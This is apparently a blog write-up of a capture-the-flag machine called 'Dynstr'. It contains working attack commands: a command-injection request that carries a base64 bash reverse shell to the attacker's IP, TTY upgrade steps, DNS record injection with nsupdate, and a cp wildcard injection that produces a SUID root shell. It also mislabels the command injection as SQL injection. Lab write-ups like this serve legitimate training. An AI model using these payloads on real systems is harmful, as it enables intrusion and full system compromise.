---
permalink: /dyster
layout: post
author: jkr
title: Writeup
date: 2021-10-17
publish: True
description: "Dynstr is a medium difficulty Linux machine featuring a blog providing Dynamic DNS services. The application API is vulnerable to command injection using which a foothold can be gained. Enumerating one of the users folders leaks SSH private key. Updating DNS zone records allows SSH access which helps in lateral movement. By exploiting a wildcard injection in a bash script root access can be obtained.
"

---
# Enumeration
## Nmap

```bash
sudo nmap -sC -sV -oA nmap/dynstr 10.10.10.244

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS


```

Three ports 
- 22
- 53
- 80

![](/Writeups/Dyster/Pasted image 20211017070917.png)

Ubuntu 20

# FootPath
### Port 80

![](/Writeups/Dyster/Pasted image 20211017070142.png)

![](/Writeups/Dyster/Pasted image 20211017070217.png)

Creds

|Username|Password|
|---|---|
|dynadns| sndanyd|

We are providing dynamic DNS for anyone with the same API as no-ip.com has. Maintaining API conformance helps make clients work properly.


Dynamic DNS for a number of domains:

-   dnsalias.htb
-   dynamicdns.htb
-   no-ip.htb

no-ip API

```
http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&myip=192.0.2.25

```

Port 53

```bash

dig axfr @10.10.10.244 dynstr.htb


; <<>> DiG 9.16.12-Debian <<>> axfr @10.10.10.244 dynstr.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.


```

Checking for zones It didn't work.

Sql Injection in API


```bash
GET /nic/update?hostname=t`echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC40OC85MDAxIDA%2bJjEK|+base64+-d+|+bash`est.no-ip.htb&myip=10.10.14.48 HTTP/1.1
Host: 10.10.10.244
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: curl/7.74.0
Accept: */*
Connection: close

```

![](/Writeups/Dyster/Pasted image 20211017073334.png)

```bash

## first command Replace ip and port

echo 'bash -i >& /dev/tcp/10.10.14.48/9001 0>&1' | base64 

## second command

echo -ne YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OC85MDAxIDA+JjEK| base64 -d | bash

```

![](/Writeups/Dyster/Pasted image 20211017073652.png)

TTY shell

```bash
python3 -c 'import pty; pty.spawn("bin/bash")'
ctrl+z 
stty -raw echo;fg 
return 
export TERM=xterm

```


# User

private_key for bindmgr found at `/home/bindmgr/support-case-C62796521`

![](/Writeups/Dyster/Pasted image 20211017074518.png)

copy to your machine use vim editor to replace new line

```vim

:s/\\n/\r/g

```

sshing using private key is not working.

![](/Writeups/Dyster/Pasted image 20211017075036.png)

Entry is only allowed from a patricular domain `.infra.dyna.htb`

looking at update file at /var/www/html/nic we can our ip to that domain using nsupdate to create new DNS record

```php
www-data@dynstr:/var/www/html/nic$ cat update 
<?php
  // Check authentication
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']))      { echo "badauth\n"; exit; }
  if ($_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo "badauth\n"; exit; }

  // Set $myip from GET, defaulting to REMOTE_ADDR
  $myip = $_SERVER['REMOTE_ADDR'];
  if ($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP))                       { $myip = $valid; }

  if(isset($_GET['hostname'])) {
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
  } else {
    echo "nochg $myip\n";
  }
?>
```


```bash
www-data@dynstr:/var/www/html/nic$ nsupdate -t 1 -k /etc/bind/infra.key 
> ADD aju.infra.dyna.htb 30 IN A 10.10.14.91
> send
> ADD 91.14.10.10.in-addr.arpa 30 IN PTR aju.infra.dyna.htb
> send
```

![](/Writeups/Dyster/Pasted image 20211017084635.png)

# Root

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
	
	```bash
	cp .version * /etc/bind/named.bindmgr/
	```
	
We can exploit cp to get root

Do following

```bash

echo 1 >.version
cp /bin/bash . 
chmod u+s bash 
touch -- '--preserve=mode'

```
	
![](/Writeups/Dyster/Pasted image 20211017085933.png)


[back](/writup)
